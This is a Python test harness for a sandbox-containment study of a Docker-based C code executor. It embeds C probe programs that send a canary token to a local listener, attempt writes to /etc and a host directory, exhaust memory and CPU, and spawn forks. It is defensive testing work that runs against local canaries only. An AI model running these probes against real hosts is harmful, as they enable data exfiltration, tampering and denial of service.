#!/usr/bin/env python
"""X1-C containment campaign harness (Paper 1). Protocol: research/confirmatory/X1/PROTOCOL_X1-C_v2.md (build B rerun of the v1 campaign).

PASS/FAIL is COMPUTED here from observables (program self-report, docker events, host canaries, executor fields);
it is never typed. Executor status is recorded but is never the sole oracle. The shipped configuration is the
unmodified SUT executor (agents/coding_executor); each permissive control applies ONE documented change through a
subprocess shim on the same code path. Everything runs locally against local canaries only.

    python x1c_harness_v2.py --dry-run                       fixtures only, writes to a temp dir (not evidence)
    python x1c_harness_v2.py --run --registered-commit <40>  official run (protocol tag gate), write-once output
"""
import csv, hashlib, json, os, platform, re, socket, subprocess, sys, tempfile, threading, time
import xml.etree.ElementTree as ET
from datetime import datetime, timezone
from pathlib import Path

REPO = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(REPO))
import agents.coding_executor.coding_executor as ce                     # the SUT executor, unmodified
from agents.coding_executor.sandbox_policy import validate_source_safety

PROTOCOL_TAG = "prereg/X1-C/v2"
SUT_TAG = "sut/X1/build-B"
REPS = 5
OUT_REL = "research/confirmatory/X1/results/x1c_v2"
SANDBOX_TIMEOUT_S = 2.0
CPU_BOUND_MS = 6000                    # 2.0 s program timeout + 4.0 s pre-specified container start / gcc slack
EXFIL_TOKEN = "X1C-EXFIL-CANARY-TOKEN-0123456789abcdef"
TESTS = [{"id": "t1", "input": "", "expected": "HELLO"}]
HDR = "#define _GNU_SOURCE\n#include <stdio.h>\n#include <string.h>\n#include <errno.h>\n#include <unistd.h>\n"
NETHDR = HDR + "#include <sys/socket.h>\n#include <sys/time.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n"
NET_BODY = """
int main(void){
  int s=socket(AF_INET,SOCK_STREAM,0);
  printf("SOCKET_RET=%d\\nSOCKET_ERRNO=%d\\n",s,s<0?errno:0); fflush(stdout);
  if(s<0) return 0;
  struct timeval tv={3,0}; setsockopt(s,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof tv);
  struct sockaddr_in a; memset(&a,0,sizeof a); a.sin_family=AF_INET; a.sin_port=htons(@PORT@);
  inet_pton(AF_INET,"@HOST@",&a.sin_addr);
  int r=connect(s,(struct sockaddr*)&a,sizeof a);
  printf("CONNECT_RET=%d\\nCONNECT_ERRNO=%d\\n",r,r<0?errno:0); fflush(stdout);
  @SEND@
  close(s); return 0; }
"""
SEND = ('if(r==0){ const char*m="@TOKEN@"; ssize_t w=send(s,m,strlen(m),0); '
        'printf("SEND_RET=%zd\\n",w); fflush(stdout); }').replace("@TOKEN@", EXFIL_TOKEN)

PROGRAMS = {
    "SEC-01": HDR + "#include <sys/ptrace.h>\nint main(void){ long r=ptrace(PTRACE_TRACEME,0,1,0);\n"
              "  printf(\"PTRACE_RET=%ld\\nPTRACE_ERRNO=%d\\n\",r,r<0?errno:0); return 0; }\n",
    "SEC-02": NETHDR + NET_BODY.replace("@SEND@", ""),
    "SEC-03": "int main(void){ int x = ; return 0; }\n",
    "SEC-04": HDR + "int main(void){ volatile int *p=0; printf(\"BEFORE_DEREF=1\\n\"); fflush(stdout); *p=42;\n"
              "  printf(\"AFTER_DEREF=1\\n\"); return 0; }\n",
    "SEC-05": HDR + "int main(void){ volatile unsigned long i=0; printf(\"LOOP_START=1\\n\"); fflush(stdout); while(1) i++; return 0; }\n",
    "SEC-06": HDR + "#include <stdlib.h>\nint main(void){ size_t sz=256u*1024u*1024u; volatile char*p=(volatile char*)malloc(sz);\n"
              "  printf(\"MALLOC_OK=%d\\n\",p!=NULL); fflush(stdout);\n"
              "  if(p){ for(size_t i=0;i<sz;i+=4096){ p[i]=1; if(i%(32u*1024u*1024u)==0){ printf(\"TOUCHED_MB=%zu\\n\",i>>20); fflush(stdout);} }\n"
              "    printf(\"TOUCH_DONE=1\\n\"); } return 0; }\n",
    "SEC-07": NETHDR + NET_BODY.replace("@SEND@", SEND),
    "SEC-08": HDR + "#include <signal.h>\n#include <sys/wait.h>\nint main(void){ int ok=0,en=0; pid_t k[100];\n"
              "  for(int i=0;i<100;i++){ pid_t p=fork(); if(p==0){ pause(); _exit(0);} if(p<0){ en=errno; break;} k[ok++]=p; }\n"
              "  printf(\"FORKS_OK=%d\\nFORK_ERRNO=%d\\n\",ok,en); fflush(stdout);\n"
              "  for(int i=0;i<ok;i++) kill(k[i],SIGKILL); for(int i=0;i<ok;i++) waitpid(k[i],0,0); return 0; }\n",
    "SEC-09": HDR + "int main(void){ FILE*f=fopen(\"/etc/x1c_tamper.txt\",\"w\");\n"
              "  printf(\"ETC_FOPEN=%d\\nETC_ERRNO=%d\\n\",f!=NULL,f?0:errno); if(f){ fputs(\"tamper\",f); fclose(f);}\n"
              "  FILE*g=fopen(\"/canary/x1c_write.txt\",\"w\");\n"
              "  printf(\"CANARY_FOPEN=%d\\nCANARY_ERRNO=%d\\n\",g!=NULL,g?0:errno); if(g){ fputs(\"tamper\",g); fclose(g);} return 0; }\n",
    "BEN":    "#include <stdio.h>\nint main(void){ printf(\"HELLO\"); return 0; }\n",
}


# ------------------------------------------------------------------------------------------------ oracles
def _i(d, k):
    try:
        return int(d[k])
    except Exception:
        return None


def crit_sec01(o):
    return {"preflight_blocked": o["pre_safe"] is False, "status_policy_blocked": o["status"] == "policy_blocked",
            "no_container_started": o["ev"]["n_create"] == 0, "host_unchanged": o["host_ok"]}


def crit_net(o, exfil):
    sr = o["sr"]
    c = {"attack_executed": "CONNECT_RET" in sr, "connect_failed": _i(sr, "CONNECT_RET") == -1,
         "listener_no_connection": o["host"]["canary_conns"] == 0, "host_unchanged": o["host_ok"]}
    if exfil:
        c["listener_no_bytes"] = o["host"]["canary_bytes"] == 0 and not o["host"]["token_seen"]
    return c


def crit_sec03(o):
    return {"status_compilation_error": o["status"] == "compilation_error", "only_compile_container": o["ev"]["n_die"] == 1,
            "host_unchanged": o["host_ok"]}


def crit_sec04(o):
    return {"attack_executed": "BEFORE_DEREF" in o["sr"], "not_resumed": "AFTER_DEREF" not in o["sr"],
            "exit_139": o["exit_code"] == 139, "status_runtime_error": o["status"] == "runtime_error", "host_unchanged": o["host_ok"]}


def crit_sec05(o):
    return {"attack_executed": "LOOP_START" in o["sr"], "status_timeout": o["status"] == "timeout", "exit_124": o["exit_code"] == 124,
            "within_cpu_bound": o["exec_ms"] is not None and o["exec_ms"] <= CPU_BOUND_MS, "host_unchanged": o["host_ok"]}


def crit_sec06(o):
    sr = o["sr"]
    return {"attack_executed": "MALLOC_OK" in sr, "killed": (o["exit_code"] == 137 or o["ev"]["oom"]),
            "did_not_complete_touch": "TOUCH_DONE" not in sr, "host_unchanged": o["host_ok"]}


def crit_sec08(o):
    sr = o["sr"]
    n = _i(sr, "FORKS_OK")
    return {"attack_executed": n is not None, "fork_refused_eagain": _i(sr, "FORK_ERRNO") == 11,
            "below_pids_limit": n is not None and n < ce.DEFAULT_PIDS_LIMIT, "host_unchanged": o["host_ok"]}


def crit_sec09(o):
    sr = o["sr"]
    return {"attack_executed": "ETC_FOPEN" in sr, "etc_write_refused": _i(sr, "ETC_FOPEN") == 0 and _i(sr, "ETC_ERRNO") in (30, 13),
            "canary_write_refused": _i(sr, "CANARY_FOPEN") == 0, "host_unchanged": o["host_ok"]}


def crit_ben(o):
    return {"status_accepted": o["status"] == "accepted", "exit_0": o["exit_code"] == 0, "no_oom": not o["ev"]["oom"],
            "host_unchanged": o["host_ok"]}


# id, name, layer, oracle fn, permissive control (None = not applicable), control description
ATTACKS = [
    ("SEC-01", "ptrace (static pre-flight layer)", crit_sec01, "preflight",
     "static pre-flight disabled (validate_source_safety patched to accept); the program then reaches the sandbox"),
    ("SEC-02", "socket + connect to host canary", lambda o: crit_net(o, False), "net",
     "--net=none removed and host-gateway alias added (default bridge network)"),
    ("SEC-03", "syntax error / compiler boundary", crit_sec03, None, "not applicable (not a configurable containment control); oracle validity by benign negative control"),
    ("SEC-04", "SIGSEGV null dereference", crit_sec04, None, "not applicable (process-level crash); oracle validity by benign negative control"),
    ("SEC-05", "infinite CPU loop", crit_sec05, "timeout", "program timeout raised from 2 s to 12 s"),
    ("SEC-06", "RAM exhaustion (touch 256 MB under a 128 MB cap)", crit_sec06, "mem", "--memory/--memory-swap raised from 128m to 1024m"),
    ("SEC-07", "exfiltration of a canary token", lambda o: crit_net(o, True), "net",
     "--net=none removed and host-gateway alias added (default bridge network)"),
    ("SEC-08", "fork attempts (bounded at 100)", crit_sec08, "pids", "--pids-limit raised from 32 to 256"),
    ("SEC-09", "filesystem write (/etc and host canary dir)", crit_sec09, "fs",
     "--read-only removed and the host canary directory bind-mounted read-write at /canary"),
]
CRIT = {a[0]: a[2] for a in ATTACKS}
CRIT["BEN"] = crit_ben


# ------------------------------------------------------------------------------------------------ host canaries
class Listener:
    def __init__(self):
        self.srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind(("0.0.0.0", 0))
        self.srv.listen(16)
        self.port = self.srv.getsockname()[1]
        self.lock = threading.Lock()
        self.reset()
        threading.Thread(target=self._loop, daemon=True).start()

    def reset(self):
        with self.lock:
            self.conns, self.data = 0, b""

    def _loop(self):
        while True:
            try:
                c, _ = self.srv.accept()
            except OSError:
                return
            with self.lock:
                self.conns += 1
            try:
                c.settimeout(1.0)
                while True:
                    b = c.recv(4096)
                    if not b:
                        break
                    with self.lock:
                        self.data += b
            except Exception:
                pass
            finally:
                c.close()

    def snapshot(self):
        with self.lock:
            return {"canary_conns": self.conns, "canary_bytes": len(self.data), "token_seen": EXFIL_TOKEN.encode() in self.data}


def dir_hash(d):
    h = hashlib.sha256()
    for p in sorted(Path(d).rglob("*")):
        h.update(str(p.relative_to(d)).encode())
        if p.is_file():
            h.update(p.read_bytes())
    return h.hexdigest()


def sh(*a, timeout=60):
    return subprocess.run(list(a), capture_output=True, text=True, timeout=timeout)


def docker_ids():
    return set(sh("docker", "ps", "-a", "-q").stdout.split())


def docker_events(t0, t1):
    r = sh("docker", "events", "--since", "%.3f" % t0, "--until", "%.3f" % t1, "--filter", "type=container", "--format", "{{json .}}")
    evs = []
    for ln in r.stdout.splitlines():
        try:
            evs.append(json.loads(ln))
        except Exception:
            pass
    return evs


def summarise_events(evs):
    n = lambda s: sum(1 for e in evs if e.get("status") == s or e.get("Action") == s)
    codes = [e.get("Actor", {}).get("Attributes", {}).get("exitCode") for e in evs if (e.get("Action") == "die" or e.get("status") == "die")]
    return {"n_create": n("create"), "n_start": n("start"), "n_die": n("die"), "n_destroy": n("destroy"),
            "oom": n("oom") > 0, "exit_codes": codes}


# ------------------------------------------------------------------------------------------------ config shim
class Shim:
    def __init__(self, mode, canary_dir, log):
        self.mode, self.canary, self.log = mode, str(canary_dir).replace("\\", "/"), log

    def __getattr__(self, k):
        return getattr(subprocess, k)

    def run(self, cmd, *a, **kw):
        if isinstance(cmd, list) and len(cmd) > 1 and cmd[1] == "run":
            cmd = self._mutate(list(cmd))
            self.log.append(cmd)
        return subprocess.run(cmd, *a, **kw)

    def _mutate(self, c):
        m = self.mode
        if m == "net":
            c = [x for x in c if x != "--net=none"]
            c.insert(2, "--add-host=host.docker.internal:host-gateway")
        elif m == "mem":
            c = ["--memory=1024m" if x == "--memory=128m" else "--memory-swap=1024m" if x == "--memory-swap=128m" else x for x in c]
        elif m == "pids":
            c = ["--pids-limit=256" if x == "--pids-limit=32" else x for x in c]
        elif m == "fs":
            c = [x for x in c if x != "--read-only"]
            c.insert(2, "-v")
            c.insert(3, "%s:/canary:rw" % self.canary)
        return c


def host_gateway_ipv4():
    r = sh("docker", "run", "--rm", "--add-host", "host.docker.internal:host-gateway", ce.SANDBOX_IMAGE,
           "sh", "-c", "getent ahostsv4 host.docker.internal | head -1 | cut -d' ' -f1")
    ip = r.stdout.strip()
    if not re.fullmatch(r"\d+\.\d+\.\d+\.\d+", ip):
        raise RuntimeError("cannot discover host-gateway IPv4: %r %r" % (r.stdout, r.stderr))
    return ip


def parse_sr(text):
    d = {}
    for ln in (text or "").splitlines():
        m = re.fullmatch(r"([A-Z0-9_]+)=(-?[0-9A-Za-z_.]+)", ln.strip())
        if m:
            d[m.group(1)] = m.group(2)
    return d


def one_run(aid, code, mode, listener, canary, timeout_s=SANDBOX_TIMEOUT_S):
    listener.reset()
    dir_before = dir_hash(canary)
    ids_before = docker_ids()
    import psutil
    mem_before, proc_before = psutil.virtual_memory().available, len(psutil.pids())
    log = []
    real_sub, real_val = ce.subprocess, ce.validate_source_safety
    pre_safe, _ = real_val(code)
    ce.subprocess = Shim(mode, canary, log)
    if mode == "preflight":
        ce.validate_source_safety = lambda c: (True, [])
    time.sleep(1.5)                              # earlier containers' events must be older than the window (Docker VM clock offset < 0.7 s)
    t0 = time.time()
    try:
        res = ce.DockerCSandbox().compile_and_execute(code, test_cases=TESTS, timeout_sec=timeout_s)
        err = None
    except Exception as e:                       # harness/SUT crash is a recorded outcome, never a silent retry
        res, err = {"status": "harness_exception"}, repr(e)
    finally:
        ce.subprocess, ce.validate_source_safety = real_sub, real_val
    t1 = time.time()
    time.sleep(1.0)
    evs = docker_events(t0 - 0.8, time.time())
    tr = (res.get("test_results") or [{}])[0]
    host = listener.snapshot()
    host["canary_dir_changed"] = dir_hash(canary) != dir_before
    orphans = sorted(docker_ids() - ids_before)
    host["orphan_containers"] = orphans
    host["free_mem_delta_bytes"] = psutil.virtual_memory().available - mem_before
    host["process_count_delta"] = len(psutil.pids()) - proc_before
    host_ok = (not host["canary_dir_changed"]) and (not orphans) and host["canary_conns"] == 0 and host["canary_bytes"] == 0
    obs = {"attack": aid, "mode": mode, "pre_safe": pre_safe, "status": res.get("status"), "exit_code": tr.get("exit_code"),
           "exec_ms": res.get("execution_time_ms"), "wall_s": round(t1 - t0, 3), "sr": parse_sr(tr.get("stdout")),
           "stdout": (tr.get("stdout") or "")[:400], "stderr": (tr.get("stderr") or "")[:400], "ev": summarise_events(evs),
           "host": host, "host_ok": host_ok, "docker_commands": log, "harness_error": err}
    return obs


def evaluate(aid, obs):
    c = CRIT[aid](obs)
    return c, all(c.values())


def sut_state():
    g = lambda *a: sh("git", "-C", str(REPO), *a).stdout.strip()
    return {"sut_tag": SUT_TAG, "sut_commit": g("rev-parse", SUT_TAG + "^{commit}"), "head": g("rev-parse", "HEAD"),
            "executor_clean_vs_sut_tag": sh("git", "-C", str(REPO), "diff", "--quiet", SUT_TAG, "--", "agents/coding_executor").returncode == 0,
            "executor_sha256": {p.name: hashlib.sha256(p.read_bytes()).hexdigest() for p in sorted((REPO / "agents/coding_executor").glob("*.py"))}}


def env_record(host_ip, port):
    di = json.loads(sh("docker", "info", "--format", "{{json .}}").stdout)
    img = json.loads(sh("docker", "image", "inspect", ce.SANDBOX_IMAGE).stdout)[0]
    return {"os": platform.platform(), "python": sys.version, "docker_client": sh("docker", "version", "--format", "{{.Client.Version}}").stdout.strip(),
            "docker_server": sh("docker", "version", "--format", "{{.Server.Version}}").stdout.strip(), "kernel": di.get("KernelVersion"),
            "os_docker": di.get("OperatingSystem"), "cgroup": [di.get("CgroupVersion"), di.get("CgroupDriver")],
            "security_options": di.get("SecurityOptions"), "runtime": di.get("DefaultRuntime"), "mem_total": di.get("MemTotal"), "ncpu": di.get("NCPU"),
            "image": ce.SANDBOX_IMAGE, "image_id": img.get("Id"), "image_repo_digests": img.get("RepoDigests"), "image_user": (img.get("Config") or {}).get("User"),
            "gcc": sh("docker", "run", "--rm", "--net=none", ce.SANDBOX_IMAGE, "gcc", "--version").stdout.splitlines()[0],
            "shipped_flags_note": "read from the recorded docker_commands of every shipped-configuration run (user 1001:1001, --net=none, --cap-drop=ALL, no-new-privileges, --read-only, tmpfs /workspace, memory/swap 128m, pids 32, cpus 1.0, seccomp = Docker default profile)",
            "host_gateway_ipv4": host_ip, "canary_listener_port": port, "psutil": __import__("psutil").__version__}


def write_outputs(out, rows, env, sut, verdicts):
    with open(out / "runs.jsonl", "x", encoding="utf-8") as f:
        for r in rows:
            f.write(json.dumps(r) + "\n")
    with open(out / "results.csv", "x", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["run_id", "attack", "config", "rep", "criteria_met", "failed_criteria", "status", "exit_code", "wall_s", "host_ok"])
        for r in rows:
            w.writerow([r["run_id"], r["attack"], r["config"], r["rep"], r["criteria_met"], ";".join(k for k, v in r["criteria"].items() if not v),
                        r["obs"]["status"], r["obs"]["exit_code"], r["obs"]["wall_s"], r["obs"]["host_ok"]])
    ts = ET.Element("testsuite", name="X1-C", tests=str(len(rows)))
    for r in rows:
        tc = ET.SubElement(ts, "testcase", classname=r["attack"] + "." + r["config"], name=r["run_id"])
        expected_met = r["config"] in ("shipped",)
        if r["expected_criteria_met"] != r["criteria_met"]:
            ET.SubElement(tc, "failure", message="observed criteria_met=%s, expected %s" % (r["criteria_met"], r["expected_criteria_met"]))
    ET.ElementTree(ts).write(out / "junit.xml", encoding="utf-8", xml_declaration=True)
    json.dump({"environment": env, "sut": sut, "verdicts": verdicts}, open(out / "environment_and_verdicts.json", "x", encoding="utf-8"), indent=2)


def campaign(out, listener, canary, host_ip, reps):
    prog = lambda aid: PROGRAMS[aid].replace("@PORT@", str(listener.port)).replace("@HOST@", host_ip)
    rows = []
    plan = [("BEN", "shipped", None, True), ("BEN", "permissive-all", None, True)]
    for aid, name, fn, mode, desc in ATTACKS:
        plan.append((aid, "shipped", None, True))
        if mode:
            plan.append((aid, "permissive", mode, False))
    for aid, config, mode, expect in plan:
        for rep in range(1, reps + 1):
            if aid == "BEN" and config == "permissive-all":
                # benign control under the most permissive shim used (net + fs): must still be classified benign
                m = "fs"
            else:
                m = mode or "shipped"
            t_s = 12.0 if (aid == "SEC-05" and config == "permissive") else SANDBOX_TIMEOUT_S
            obs = one_run(aid, prog(aid), m, listener, canary, timeout_s=t_s)
            crit, met = evaluate(aid, obs)
            rows.append({"run_id": "%s.%s.r%d" % (aid, config, rep), "attack": aid, "config": config, "rep": rep, "mode": m,
                         "criteria": crit, "criteria_met": met, "expected_criteria_met": expect, "timestamp": datetime.now(timezone.utc).isoformat(),
                         "program_sha256": hashlib.sha256(prog(aid).encode()).hexdigest(), "obs": obs})
            print("%-7s %-15s r%d met=%s %s" % (aid, config, rep, met, "" if met == expect else "<-- differs from expectation"), flush=True)
    # cross-oracle negative control: every attack oracle applied to the benign shipped observations must FAIL
    ben = [r["obs"] for r in rows if r["attack"] == "BEN" and r["config"] == "shipped"]
    cross = {a[0]: [all(CRIT[a[0]](b).values()) for b in ben] for a in ATTACKS}
    verdicts = {}
    for aid, name, fn, mode, desc in ATTACKS:
        sh_r = [r for r in rows if r["attack"] == aid and r["config"] == "shipped"]
        pe_r = [r for r in rows if r["attack"] == aid and r["config"] == "permissive"]
        verdicts[aid] = {"name": name, "control": desc,
                         "shipped_criteria_met": "%d/%d" % (sum(r["criteria_met"] for r in sh_r), len(sh_r)),
                         "permissive_breach_detected": ("%d/%d" % (sum(not r["criteria_met"] for r in pe_r), len(pe_r))) if pe_r else "n/a",
                         "benign_cross_oracle_false_positives": "%d/%d" % (sum(cross[aid]), len(cross[aid])),
                         "shipped_failed_criteria": sorted({k for r in sh_r for k, v in r["criteria"].items() if not v}),
                         "oracle_valid": ((all(not r["criteria_met"] for r in pe_r) if pe_r else True) and not any(cross[aid])),
                         "shipped_contained_in_this_harness": all(r["criteria_met"] for r in sh_r)}
    b_all = [r for r in rows if r["attack"] == "BEN"]
    verdicts["BEN"] = {"benign_criteria_met": "%d/%d" % (sum(r["criteria_met"] for r in b_all), len(b_all))}
    return rows, verdicts


def dry_run():
    """Fixtures only (benign + connectivity/permission plumbing); NOT evidence; temp output."""
    listener = Listener()
    canary = Path(tempfile.mkdtemp(prefix="x1c_canary_dry_"))
    (canary / "canary.txt").write_text("CANARY-UNCHANGED")
    ip = host_gateway_ipv4()
    print("host gateway ipv4:", ip, "listener port:", listener.port)
    b = one_run("BEN", PROGRAMS["BEN"], "shipped", listener, canary)
    print("benign shipped:", b["status"], b["exit_code"], b["exec_ms"], b["ev"], b["host_ok"], evaluate("BEN", b))
    fx_net = NETHDR + NET_BODY.replace("@SEND@", SEND).replace("@PORT@", str(listener.port)).replace("@HOST@", ip)
    n = one_run("SEC-07", fx_net, "net", listener, canary)
    print("fixture net (permissive):", n["sr"], n["host"]["canary_conns"], n["host"]["canary_bytes"], n["host"]["token_seen"], n["status"])
    fx_fs = HDR + "int main(void){ FILE*g=fopen(\"/canary/x1c_fixture.txt\",\"w\"); printf(\"CANARY_FOPEN=%d\\nCANARY_ERRNO=%d\\n\",g!=NULL,g?0:errno); if(g){fputs(\"x\",g);fclose(g);} return 0; }\n"
    f = one_run("SEC-09", fx_fs, "fs", listener, canary)
    print("fixture fs (permissive):", f["sr"], "canary_dir_changed", f["host"]["canary_dir_changed"], f["status"])
    print("docker command sample:", " ".join(b["docker_commands"][0])[:300])


def official(argv):
    rc = argv[argv.index("--registered-commit") + 1] if "--registered-commit" in argv[:-1] else ""
    g = lambda *a: sh("git", "-C", str(REPO), *a)
    assert re.fullmatch("[0-9a-f]{40}", rc), "40-hex --registered-commit required"
    assert g("cat-file", "-t", "refs/tags/" + PROTOCOL_TAG).stdout.strip() == "tag", "protocol tag missing/not annotated"
    assert g("rev-parse", "refs/tags/%s^{commit}" % PROTOCOL_TAG).stdout.strip() == rc == g("rev-parse", "HEAD").stdout.strip(), "HEAD != protocol tag commit"
    for rel in ("research/confirmatory/X1/x1c_harness_v2.py", "research/confirmatory/X1/PROTOCOL_X1-C_v2.md"):
        blob = subprocess.run(["git", "-C", str(REPO), "cat-file", "blob", "%s:%s" % (rc, rel)], capture_output=True).stdout
        assert blob == (REPO / rel).read_bytes(), rel + " differs from the tagged blob"
    sut = sut_state()
    assert sut["executor_clean_vs_sut_tag"], "executor differs from the SUT tag"
    out = REPO / OUT_REL
    os.makedirs(out.parent, exist_ok=True)
    os.mkdir(out)                                                    # write-once
    listener = Listener()
    canary = Path(tempfile.mkdtemp(prefix="x1c_canary_"))
    (canary / "canary.txt").write_text("CANARY-UNCHANGED")
    ip = host_gateway_ipv4()
    env = env_record(ip, listener.port)
    t0 = datetime.now(timezone.utc).isoformat()
    rows, verdicts = campaign(out, listener, canary, ip, REPS)
    verdicts["_run"] = {"protocol_tag": PROTOCOL_TAG, "registered_commit": rc, "started_utc": t0, "finished_utc": datetime.now(timezone.utc).isoformat(),
                        "harness_sha256": hashlib.sha256(Path(__file__).read_bytes()).hexdigest(), "reps": REPS}
    write_outputs(out, rows, env, sut, verdicts)
    print(json.dumps(verdicts, indent=1))


if __name__ == "__main__":
    if "--dry-run" in sys.argv:
        dry_run()
    elif "--run" in sys.argv:
        official(sys.argv)
    else:
        print(__doc__)
